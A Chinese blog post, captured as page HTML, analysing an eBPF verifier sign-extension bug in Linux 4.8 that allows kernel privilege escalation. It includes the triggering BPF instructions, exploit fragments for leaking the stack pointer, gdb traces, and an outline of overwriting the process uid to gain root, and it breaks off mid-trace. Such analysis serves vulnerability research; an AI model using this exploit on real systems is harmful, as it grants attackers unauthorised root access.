@@ -1,0 +1,749 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="实验环境12$ uname -aLinux 4.8.17 #24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 内核调试选择自己编译版本，没有使用安装版本。gdb插件使用gef插件。 漏洞原因分析漏洞的原因是因为在做预检查的时候没有注意到两个参数类型不匹配。Bpf指令的校验是在函数do_check中，代">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内核提权.md">
+<meta property="og:url" content="https://jaguo.github.io/2018/12/10/内核提权-md/index.html">
+<meta property="og:site_name" content="Lazzzzzzy">
+<meta property="og:description" content="实验环境12$ uname -aLinux 4.8.17 #24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 内核调试选择自己编译版本，没有使用安装版本。gdb插件使用gef插件。 漏洞原因分析漏洞的原因是因为在做预检查的时候没有注意到两个参数类型不匹配。Bpf指令的校验是在函数do_check中，代">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-12-10T08:32:26.891Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="内核提权.md">
+<meta name="twitter:description" content="实验环境12$ uname -aLinux 4.8.17 #24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 内核调试选择自己编译版本，没有使用安装版本。gdb插件使用gef插件。 漏洞原因分析漏洞的原因是因为在做预检查的时候没有注意到两个参数类型不匹配。Bpf指令的校验是在函数do_check中，代">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://jaguo.github.io/2018/12/10/内核提权-md/"/>
+
+
+
+
+
+  <title>内核提权.md | Lazzzzzzy</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lazzzzzzy</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jaguo.github.io/2018/12/10/内核提权-md/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Guo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lazzzzzzy">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">内核提权.md</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-10T16:31:39+08:00">
+                2018-12-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br><span class="line">Linux 4.8.17 <span class="comment">#24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>
+<p>内核调试选择自己编译版本，没有使用安装版本。gdb插件使用<code>gef</code>插件。</p>
+<h1 id="漏洞原因分析"><a href="#漏洞原因分析" class="headerlink" title="漏洞原因分析"></a>漏洞原因分析</h1><p>漏洞的原因是因为在做预检查的时候没有注意到两个参数类型不匹配。Bpf指令的校验是在函数<code>do_check</code>中，代码路径为kernel/bpf/verifier.c。<code>do_check</code>通过一个无限循环来遍历我们提供的bpf指令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),             /* r9 = (u32)0xFFFFFFFF   */</span><br><span class="line">2.BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),   /* if (r9 == -1) &#123;        */</span><br><span class="line">3.BPF_MOV64_IMM(BPF_REG_0, 0),                      /*   exit(0);             */</span><br><span class="line">4.BPF_EXIT_INSN()</span><br><span class="line">5. ...</span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>第一条指令是个简单的赋值语句，把0xFFFFFFFF这个值赋值给r9.</p>
+</li>
+<li><p>第二条指令是个条件跳转指令，如果r9等于0xFFFFFFFF，则退出程序，终止执行；如果r9不等于0xFFFFFFFF，则跳过后面2条执行继续执行第5条指令。</p>
+</li>
+<li><p>虚拟执行的时候，do_check检测到第2条指令等式恒成立，所以认为BPF_JNE的跳转永远不会发生，第4条指令之后的指令永远不会执行，所以检测结束，do_check返回成功。</p>
+</li>
+<li><p>真实执行的时候，由于一个符号扩展的bug，导致第2条指令中的等式不成立，于是cpu就跳转到第5条指令继续执行，这里是漏洞产生的根因，这4条指令，可以绕过BPF的代码安全检查。既然安全检查被绕过了，用户就可以随意往内核中注入代码了，提权就水到渠成了：先获取到task_struct的地址，然后定位到cred的地址，然后定位到uid的地址，然后直接将uid的值改为0，然后启动/bin/bash。  </p>
+</li>
+</ol>
+<p>第一条赋值语句<code>BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF)</code>，<code>do_check</code>中最终的赋值语句如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1514</span>		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">1515</span>			<span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment">1516			 * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment">1517			 */</span></span><br><span class="line"><span class="number">1518</span>			regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line"><span class="number">1519</span>			regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line"><span class="number">1520</span>		&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在<code>do_check()</code>中<code>BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2)</code>的检查操作。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    dst_reg = &amp;regs[insn-&gt;dst_reg];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* detect if R == 0 where R was initialized to zero earlier */</span></span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">        (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">-&gt;      dst_reg-&gt;type == CONST_IMM &amp;&amp; dst_reg-&gt;imm == insn-&gt;imm) &#123;</span><br><span class="line">        <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">            <span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment">             * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            *insn_idx += insn-&gt;off;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment">             * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment">             * that's where the program will go</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
+<p>其中<code>dst_reg</code>为虚拟执行过程中的寄存器结构体，结构体定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> &#123;</span></span><br><span class="line">    <span class="keyword">enum</span> bpf_reg_type type;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="comment">/* valid when type == CONST_IMM | PTR_TO_STACK | UNKNOWN_VALUE */</span></span><br><span class="line">        s64 imm;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* valid when type == PTR_TO_PACKET* */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            u32 id;</span><br><span class="line">            u16 off;</span><br><span class="line">            u16 range;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment">         *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// define insn</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">    __u8	code;		<span class="comment">/* opcode */</span></span><br><span class="line">    __u8	dst_reg:<span class="number">4</span>;	<span class="comment">/* dest register */</span></span><br><span class="line">    __u8	src_reg:<span class="number">4</span>;	<span class="comment">/* source register */</span></span><br><span class="line">    __s16	off;		<span class="comment">/* signed offset */</span></span><br><span class="line">    __s32	imm;		<span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，在此处<code>imm</code>是一个有符号的64位整形。可以看到等号两侧的数据类型完全一致，都为有符号整数，所以此处条件跳转条件恒成立，不会往临时栈中push分支B指令编号。<br><strong>而在具体执行中:</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">763</span>	 	JMP_JNE_K:</span><br><span class="line">-&gt;  <span class="number">764</span>	 		<span class="keyword">if</span> (DST != IMM) &#123;</span><br><span class="line">    <span class="number">765</span>	 			insn += insn-&gt;off;</span><br><span class="line">    <span class="number">766</span>	 			CONT_JMP;</span><br><span class="line">    <span class="number">767</span>	 		&#125;</span><br><span class="line">    <span class="number">768</span>	 		CONT;</span><br></pre></td></tr></table></figure></p>
+<p>其中<code>DST</code>为目标寄存器，<code>IMM</code>为立即数，我们跟进<code>DST</code>的定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DST	regs[insn-&gt;dst_reg]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SRC	regs[insn-&gt;src_reg]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// define regs[], regs is u64</span></span><br><span class="line">u64 regs[MAX_BPF_REG];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMM	insn-&gt;imm</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">    __u8	code;		<span class="comment">/* opcode */</span></span><br><span class="line">    __u8	dst_reg:<span class="number">4</span>;	<span class="comment">/* dest register */</span></span><br><span class="line">    __u8	src_reg:<span class="number">4</span>;	<span class="comment">/* source register */</span></span><br><span class="line">    __s16	off;		<span class="comment">/* signed offset */</span></span><br><span class="line">    __s32	imm;		<span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>很明显，等号两边的数据类型是不一致的，所以导致这里的条件跳转语句的结果完全相反。</p>
+<h1 id="do-check"><a href="#do-check" class="headerlink" title="do_check"></a>do_check</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--source:kernel/bpf/verifier.c+<span class="number">2419</span>--&gt;</span><br><span class="line">   <span class="number">2414</span>	 				&#125;</span><br><span class="line">   <span class="number">2415</span>	 </span><br><span class="line">   <span class="number">2416</span>	 				insn_idx += insn-&gt;off + <span class="number">1</span>;</span><br><span class="line">   <span class="number">2417</span>	 				<span class="keyword">continue</span>;</span><br><span class="line">   <span class="number">2418</span>	 </span><br><span class="line">-&gt; <span class="number">2419</span>	 			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">   <span class="number">2420</span>	 				<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">   <span class="number">2421</span>	 				    insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">   <span class="number">2422</span>	 				    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">   <span class="number">2423</span>	 				    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">   <span class="number">2424</span>	 					verbose(<span class="string">"BPF_EXIT uses reserved fields\n"</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--source:kernel/bpf/verifier.c+<span class="number">2444</span>--&gt;</span><br><span class="line">   <span class="number">2439</span>	 					verbose(<span class="string">"R0 leaks addr as return value\n"</span>);</span><br><span class="line">   <span class="number">2440</span>	 					<span class="keyword">return</span> -EACCES;</span><br><span class="line">   <span class="number">2441</span>	 				&#125;</span><br><span class="line">   <span class="number">2442</span>	 </span><br><span class="line">   <span class="number">2443</span>	 process_bpf_exit:</span><br><span class="line">-&gt; <span class="number">2444</span>	 				insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">   <span class="number">2445</span>	 				<span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="number">2446</span>	 					<span class="keyword">break</span>;</span><br><span class="line">   <span class="number">2447</span>	 				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="number">2448</span>	 					do_print_state = <span class="literal">true</span>;</span><br><span class="line">   <span class="number">2449</span>	 					<span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; n</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--source:kernel/bpf/verifier.c+<span class="number">2445</span>--&gt;</span><br><span class="line">   <span class="number">2443</span>	 process_bpf_exit:</span><br><span class="line">   <span class="number">2444</span>	 				insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">        <span class="comment">// insn_idx=-0x1</span></span><br><span class="line">-&gt; <span class="number">2445</span>	 				<span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="number">2446</span>	 					<span class="keyword">break</span>;</span><br><span class="line">   <span class="number">2447</span>	 				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="number">2448</span>	 					do_print_state = <span class="literal">true</span>;</span><br><span class="line">   <span class="number">2449</span>	 					<span class="keyword">continue</span>;</span><br><span class="line">   <span class="number">2450</span>	 				&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; i r eax</span><br><span class="line">eax          0xffffffff 	0xffffffff</span><br></pre></td></tr></table></figure>
+<p>当<code>insn_idx</code>小于0时，<code>do_check()</code>退出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">call trace</span><br><span class="line">[#0] 0xffffffff811826bf → Name: do_check(env=0x0 &lt;irq_stack_union&gt;)</span><br><span class="line">[#1] 0xffffffff81184e4e → Name: bpf_check(prog=0xffff880222703e00, attr=&lt;optimized out&gt;)</span><br><span class="line">[#2] 0xffffffff81180794 → Name: bpf_prog_load(attr=0xffff880222703ee8)</span><br><span class="line">[#3] 0xffffffff81180d1b → Name: SYSC_bpf(size=0x30, uattr=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;)</span><br><span class="line">[#4] 0xffffffff81180d1b → Name: SyS_bpf(cmd=0x5, uattr=0x7fff6c8ffa30, size=&lt;optimized out&gt;)</span><br><span class="line">[#5] 0xffffffff818978b6 → Name: entry_SYSCALL_64()</span><br></pre></td></tr></table></figure></p>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn()"></a>pwn()</h1><h2 id="获取rbp指针"><a href="#获取rbp指针" class="headerlink" title="获取rbp指针"></a>获取<code>rbp</code>指针</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">fp = __get_fp();</span><br><span class="line"><span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">    __exit(<span class="string">"bogus fp"</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __get_fp(<span class="keyword">void</span>) &#123;</span><br><span class="line">    __update_elem(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __update_elem(a, b, c) \</span></span><br><span class="line">    bpf_update_elem(<span class="number">0</span>, (a)); \</span><br><span class="line">    bpf_update_elem(<span class="number">1</span>, (b)); \</span><br><span class="line">    bpf_update_elem(<span class="number">2</span>, (c)); \</span><br><span class="line">    writemsg();</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">uint64_t</span> key, <span class="keyword">uint64_t</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">        .map_fd = mapfd,</span><br><span class="line">        .key = (__u64)&amp;key,</span><br><span class="line">        .value = (__u64)&amp;value,</span><br><span class="line">        .flags = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在<code>__get_fp()</code>函数中，会进行三次<code>__update_elem</code>操作，操作后<code>map</code>会变成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">map[0] = 1  </span><br><span class="line">map[1] = 0  </span><br><span class="line">map[2] = 0</span><br></pre></td></tr></table></figure></p>
+<p>在gdb调试过程中，对<code>array_map_update_elem()</code>下断点，该函数的主要作用是将<code>map</code>中的值更新，也就是写<code>map</code>操作；对<code>array_map_lookup_elem()</code>下断点，该函数的主要作用是取<code>map</code>中的值，也就是读<code>map</code>操作。<br>结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">array_map_update_elem (map=0xffff880228763080, key=0xffff8801eb387d58, value=0xffff8801eb387988, map_flags=0x0) at kernel/bpf/arraymap.c:181</span><br><span class="line">gef➤  p *(u32 *)key</span><br><span class="line">$9 = 0x0</span><br><span class="line">gef➤  p *(u64 *)value</span><br><span class="line">$11 = 0x1</span><br><span class="line">...</span><br><span class="line">array_map_update_elem (map=0xffff880228763080, key=0xffff8801eb387d58, value=0xffff8801eb387988, map_flags=0x0) at kernel/bpf/arraymap.c:181</span><br><span class="line">gef➤  p *(u32 *)key</span><br><span class="line">$14 = 0x1</span><br><span class="line">gef➤  p *(u64 *)value</span><br><span class="line">$15 = 0x0</span><br><span class="line">...</span><br><span class="line">array_map_update_elem (map=0xffff880228763080, key=0xffff8801ee2d2508, value=0xffff8801ee2d23d8, map_flags=0x0) at kernel/bpf/arraymap.c:181</span><br><span class="line">gef➤  p *(u32 *)key</span><br><span class="line">$16 = 0x2</span><br><span class="line">gef➤  p *(u64 *)value</span><br><span class="line">$17 = 0x0</span><br><span class="line"></span><br><span class="line"># call trace</span><br><span class="line">[#0] 0xffffffff81186fa0 → Name: array_map_update_elem(map=0xffff880228763080, key=0xffff8801ee2d2508, value=0xffff8801ee2d23d8, map_flags=0x0)</span><br><span class="line">[#1] 0xffffffff81180f68 → Name: map_update_elem(attr=&lt;optimized out&gt;)</span><br><span class="line">[#2] 0xffffffff81180f68 → Name: SYSC_bpf(size=&lt;optimized out&gt;, uattr=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;)</span><br><span class="line">[#3] 0xffffffff81180f68 → Name: SyS_bpf(cmd=&lt;optimized out&gt;, uattr=&lt;optimized out&gt;, size=&lt;optimized out&gt;)</span><br><span class="line">[#4] 0xffffffff818978b6 → Name: entry_SYSCALL_64()</span><br></pre></td></tr></table></figure></p>
+<p>该操作在用户空间修改<code>map</code>的值，使<code>map</code>中的值为用户可控的值。<br>其中当<code>map[0] = 1</code>时，<code>prog</code>函数定义的代码将执行取<code>rsp</code>操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">array_map_lookup_elem (map=0xffff880228763080, key=0xffff880222703c7c) at kernel/bpf/arraymap.c:111</span><br><span class="line">gef➤  p *(u32 *)key</span><br><span class="line">$18 = 